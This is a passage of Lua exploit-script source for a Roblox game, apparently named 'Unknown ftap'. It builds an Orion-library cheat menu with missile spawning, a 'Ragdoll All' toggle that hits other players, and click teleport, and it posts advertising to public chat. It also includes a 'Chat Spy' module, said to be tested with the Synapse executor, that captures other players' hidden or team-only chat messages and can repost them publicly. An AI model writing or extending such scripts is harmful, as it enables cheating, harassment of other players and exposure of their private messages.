				for _, p in pairs(v:GetDescendants()) do
					if p:IsA("BasePart") then
						p.CanCollide = true
					end
				end
			end
			for _, v in ipairs(bodyPositions) do
				v:Destroy()
			end
			bodyPositions = {}
			for _, v in ipairs(alignOrientations) do
				v:Destroy()
			end
			alignOrientations = {}
			for _, v in ipairs(lightbitparts) do
				v:FindFirstChild("Attachment"):Destroy()
			end
			lightbitparts = {}
		end
    end
})


KeybindSection2:AddBind({
    Name = "secret little keybind for dev (wont do anything for you)",
    Default = "K",
    Hold = true,
    Save = false,
    Flag = "LightBitSpeedUpDev",
    Callback = function(isHeld)
        pcall(function()
            lightbitcon:Disconnect()
        end)
		lightbitcon = RunService.Heartbeat:Connect(function()
			if isHeld then
				lightbit = lightbit + 0.025
			else
				if lightbit > 0.3125 then
					lightbit = lightbit - 0.0125
				end
			end
		end)
    end
})
KeybindSection2:AddBind({
    Name = "another little keybind for dev (wont do anything for you)",
    Default = "J",
    Hold = false,
    Save = false,
    Flag = "LightBitRadiusUpDev",
    Callback = function(isHeld)
        pcall(function()
            lightbitcon2:Disconnect()
        end)
		lightbitcon2 = RunService.Heartbeat:Connect(function()
			if isHeld then
				usingradius = usingradius + 1
			else 
				if usingradius > lightbitradius then
					usingradius = usingradius - 1
				end
			end
		end)
    end
})

ExplosionTab:AddDropdown({
	Name = "Toy to load",
	Default = "BombMissile",
	Options = {"BombMissile", "FireworkMissile"},
	Callback = function(Value)
		_G.ToyToLoad = Value
	end    
})
ExplosionTab:AddSlider({
    Name = "Max amount of missiles",
    Min = 1,
    Max = localPlayer.ToysLimitCap.Value / 10,
    Color = Color3.fromRGB(240, 0, 0),
    ValueName = "Missiles",
    Increment = 1,
    Default = _G.MaxMissiles,
    Save = false,
    Flag = "NaxMissilesSlider",
    Callback = function(value)
        _G.MaxMissiles = value
    end
})

ExplosionTab:AddToggle({
    Name = "Auto Reload Cache",
    Default = false,
    Color = Color3.fromRGB(240, 0, 0),
    Save = false,
    Flag = "AutoReloadBombs",
    Callback = function(enabled)
       reloadMissile(enabled)
    end
})
DevTab:AddLabel("Spawn and eat a banana first!")

DevTab:AddToggle({
    Name = "Ragdoll All",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = false,
    Callback = function(enabled)
        if enabled then
            ragdollAllCoroutine = coroutine.create(ragdollAll)
            coroutine.resume(ragdollAllCoroutine)
        else
            if ragdollAllCoroutine then
                coroutine.close(ragdollAllCoroutine)
                ragdollAllCoroutine = nil
            end
        end
    end
})

OrionLib:MakeNotification({Name = "Welcome", Content = "Welcome to Unknown ftap ", Image = "rbxassetid://4483345998", Time = 5})
OrionLib:Init()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = DefaultChatSystemChatEvents:WaitForChild("SayMessageRequest")

SayMessageRequest:FireServer("♡ Unknnow ftap, The Best Of All Time by d a r k n e s s  ♡", "All")
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local function teleport()
    if mouse.Target then
        player.Character:MoveTo(mouse.Hit.p)
    end
end

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if input.KeyCode == Enum.KeyCode.X and not gameProcessedEvent then
        teleport()
    end
end)
print("-- Chat Spy Executed --")
print("Type \"spy\" to enable or disable the chat spy.")
print("Only tested if this works executed with Synapse (should work with other exploits though)")
print("https://github.com/dehoisted/Chat-Spy")

-- Config
Config = {
	enabled = true,
	spyOnMyself = false,
	public = false,
	publicItalics = true
}

-- Customizing Log Output
PrivateProperties = {
	Color = Color3.fromRGB(255,0,0); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}

	local StarterGui = game:GetService("StarterGui")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
	local instance = (_G.chatSpyInstance or 0) + 1
	_G.chatSpyInstance = instance

	local function onChatted(p,msg)
		if _G.chatSpyInstance == instance then
			if p==player and msg:lower():sub(1,4)==":spy" then
				Config.enabled = not Config.enabled
				wait(0.3)
				PrivateProperties.Text = "[SPY "..(Config.enabled and "EN" or "DIS").."ABLED]"
				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
			elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
				local hidden = true
				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
						hidden = false
					end
				end)
				wait(1)
				conn:Disconnect()
				if hidden and Config.enabled then
					if Config.public then
						saymsg:FireServer((Config.publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
					else
						PrivateProperties.Text = "[SPY] [".. p.Name .."]: "..msg
						StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
					end
				end
			end
		end
	end
	
	for _,p in ipairs(Players:GetPlayers()) do
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end

	Players.PlayerAdded:Connect(function(p)
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end)

	PrivateProperties.Text = "[SPY "..(Config.enabled and "EN" or "DIS").."ABLED]"
	StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
	local chatFrame = player.PlayerGui.Chat.Frame
	chatFrame.ChatChannelParentFrame.Visible = true
	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
    local SayMessageRequest = DefaultChatSystemChatEvents:WaitForChild("SayMessageRequest")

SayMessageRequest:FireServer(" Enjoy :) ", "All")
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
